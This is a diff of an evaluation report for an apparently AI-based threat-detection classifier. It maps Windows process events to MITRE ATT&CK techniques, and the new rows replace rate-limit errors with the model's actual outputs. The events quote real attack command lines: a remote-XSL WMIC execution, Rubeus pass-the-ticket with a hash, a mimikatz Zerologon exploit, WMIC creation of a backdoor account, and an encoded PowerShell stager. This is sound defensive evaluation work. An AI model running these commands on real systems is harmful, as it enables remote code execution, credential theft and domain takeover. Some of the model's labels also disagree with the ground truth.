@@ -128,56 +128,56 @@ Read every row. Look for failure shapes, not a score.
 - tier: 1 (escalation: None)  lookups: []
 - trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/73610fb8303abd6e4c85729a55ae8689
 
-## day3-123  label=true_positive ['T1220']  got=None  conf=None
+## day3-123  label=true_positive ['T1220']  got=true_positive ['T1220', 'T1047'] conf=0.95
 - event: `wmic  process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"`
 - label why: wmic process list /FORMAT:<remote .xsl URL> downloads and executes JScript from a remote stylesheet.
-- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
-- iocs: None  evidence: None  retries: None
-- retrieved: None
-- tier: None (escalation: None)  lookups: None
-- trace: None
+- model why: The event shows WMIC.exe executing with a /FORMAT parameter pointing to a remote XSL script from GitHub, which matches the XSL Script Processing technique (T1220) leveraging Windows Management Instrumentation (T1047) for code execution.
+- iocs: ['https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl', 'C:\\Windows\\System32\\wbem\\WMIC.exe']  evidence: ['events[0].process.command_line', 'events[0].process.image', 'events[0].process.parent.command_line']  retries: 0
+- retrieved: ['T1220', 'T1047', 'T1218.014', 'T1204.002', 'T1057']
+- tier: 1 (escalation: None)  lookups: []
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/4e0b9c1e4d14c2fa9a7229f173f2108a
 
-## day3-145  label=true_positive ['T1550.003']  got=None  conf=None
+## day3-145  label=true_positive ['T1550.003']  got=true_positive ['T1550.003', 'T1059.001'] conf=0.95
 - event: `"C:\users\sbeavers\Desktop\Rubeus.exe" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt`
 - label why: Rubeus asktgt with an RC4 hash and /ptt requests a Kerberos ticket and injects it into the session (pass-the-ticket).
-- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
-- iocs: None  evidence: None  retries: None
-- retrieved: None
-- tier: None (escalation: None)  lookups: None
-- trace: None
+- model why: The event shows execution of Rubeus.exe from a user desktop with command line arguments 'asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt', which is a known hacktool technique for requesting a TGT using an NT hash and injecting it (Pass the Ticket). The parent process is powershell.exe with a large base64‑encoded command line, indicating PowerShell execution (T1059.001).
+- iocs: ['C:/Users/sbeavers/Desktop/Rubeus.exe', '81d310fa34e6a56a31145445891bb7b8']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.image', 'events[0].process.parent.command_line']  retries: 0
+- retrieved: ['T1059.001', 'T1216.002', 'T1546.013', 'T1555.004', 'T1546.007']
+- tier: 1 (escalation: None)  lookups: []
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/746b215b72fb0b3b2c4535faad836680
 
-## day3-151  label=true_positive ['T1210']  got=None  conf=None
+## day3-151  label=true_positive ['T1210']  got=true_positive ['T1003.006'] conf=0.95
 - event: `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe  "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
 - label why: mimikatz lsadump::zerologon /target exploits CVE-2020-1472 (Zerologon) against a domain controller.
-- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
-- iocs: None  evidence: None  retries: None
-- retrieved: None
-- tier: None (escalation: None)  lookups: None
-- trace: None
+- model why: The event shows execution of mimikatz.exe from a user's Downloads directory with the command line invoking the lsadump::zerologon module to exploit Zerologon against a domain controller, which is a credential‑access technique aimed at dumping NTDS via DCSync.
+- iocs: ['C:/Users/pgustavo/Downloads/mimikatz_trunk/x64/mimikatz.exe', 'lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit', 'cmd.exe /c C:/Users/pgustavo/Downloads/mimikatz_trunk/x64/mimikatz.exe lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit exit']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.command_line']  retries: 0
+- retrieved: ['T1218.014', 'T1218.011', 'T1218.003', 'T1218.004', 'T1204.002']
+- tier: 1 (escalation: None)  lookups: []
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/baef99fa2ef155d69e1756c00d2e46f9
 
-## day3-158  label=true_positive ['T1047']  got=None  conf=None
+## day3-158  label=true_positive ['T1047']  got=true_positive ['T1047', 'T1136.001'] conf=0.95
 - event: `"C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add backdoor paw0rd1"`
 - label why: wmic /node:WORKSTATION6 process call create runs a command on a remote host over WMI.
-- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
-- iocs: None  evidence: None  retries: None
-- retrieved: None
-- tier: None (escalation: None)  lookups: None
-- trace: None
+- model why: WMIC.exe is used with /node to remotely execute a 'net user /add backdoor paw0rd1' command on WORKSTATION6, indicating adversarial lateral movement via WMI and creation of a local account.
+- iocs: ['C:/Windows/System32/wbem/WMIC.exe', '/node:WORKSTATION6 process call create net user /add backdoor paw0rd1']  evidence: ['events[0].process.image', 'events[0].process.command_line']  retries: 0
+- retrieved: ['T1218.014', 'T1546.007', 'T1218.003', 'T1059.001', 'T1134.002']
+- tier: 1 (escalation: None)  lookups: []
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/550a0dd8f849aaffff9285cbc50493b0
 
-## day3-166  label=true_positive ['T1021.003']  got=None  conf=None
+## day3-166  label=true_positive ['T1021.003']  got=needs_review ['T1570'] conf=0.65
 - event: `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
 - label why: MoveExcel4.exe <IP> attempts DCOM lateral movement by remote Excel 4.0 macro execution.
-- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
-- iocs: None  evidence: None  retries: None
-- retrieved: None
-- tier: None (escalation: None)  lookups: None
-- trace: None
+- model why: A non-standard executable 'MoveExcel4.exe' runs from a user's Desktop with a private IP address (172.18.39.6) as a command-line argument, launched via cmd.exe. This pattern is consistent with a custom tool transferring files or tools to/from an internal host (T1570 Lateral Tool Transfer), but the binary name could also indicate a legitimate internal utility for moving Excel files to a network share. No threat intelligence, hash, or behavioral context is available to confirm malicious intent.
+- iocs: ['C:/Users/pgustavo/Desktop/MoveExcel4.exe', '172.18.39.6']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.image']  retries: 0
+- retrieved: ['T1070.010', 'T1218.014', 'T1570', 'T1218.003', 'T1080']
+- tier: 2 (escalation: confidence 0.60 < 0.7)  lookups: []
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/0902d881339379a8ad1446d46c63a551
 
-## day3-176  label=true_positive ['T1569.002']  got=None  conf=None
+## day3-176  label=true_positive ['T1569.002']  got=true_positive ['T1059.001'] conf=0.95
 - event: `C:\windows\system32\cmd.exe /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAc`
 - label why: cmd.exe started by services.exe running 'start /b powershell -enc' is a remote service executing an encoded stager (PsExec-style).
-- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
-- iocs: None  evidence: None  retries: None
-- retrieved: None
-- tier: None (escalation: None)  lookups: None
-- trace: None
+- model why: The event shows cmd.exe launched by services.exe executing a heavily obfuscated, base64-encoded PowerShell command that disables script block logging, modifies Windows Defender policy registry keys, sets up a proxy, and downloads content—clear indicators of malicious PowerShell usage for execution and defense evasion.
+- iocs: ['C:/Windows/System32/cmd.exe', 'C:/windows/system32/services.exe', 'HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System']  evidence: ['events[0].process.command_line', 'events[0].process.image', 'events[0].process.parent.image']  retries: 0
+- retrieved: ['T1059.001', 'T1543.003', 'T1547.001', 'T1546.007', 'T1059.003']
+- tier: 1 (escalation: None)  lookups: []
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/69576ef2c5738e718316aaa475a6e428
